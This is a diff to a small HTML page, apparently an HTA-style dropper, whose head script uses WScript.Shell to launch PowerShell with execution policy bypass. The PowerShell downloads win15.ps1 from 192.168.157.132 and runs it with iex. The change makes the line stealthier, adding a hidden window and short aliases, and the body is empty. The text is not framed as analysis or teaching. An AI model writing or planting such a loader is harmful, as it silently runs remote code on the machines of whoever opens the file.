@@ -2,9 +2,9 @@
 <head>
 <script>
 var shell = new ActiveXObject("WScript.Shell");
-shell.Run("powershell -NoProfile -ExecutionPolicy Bypass -Command \"$url='http://192.168.157.132/payload/win15.ps1'; iex (Invoke-WebRequest $url -UseBasicParsing).Content\"");
+var cmd = 'powershell -w hidden -ep bypass -c "$url=\'http://192.168.157.132/payload/win15.ps1\'; iex (iwr $url -UseBasicParsing).Content"';
+shell.Run(cmd);
 </script>
 </head>
-<body>
-</body>
+<body></body>
 </html>
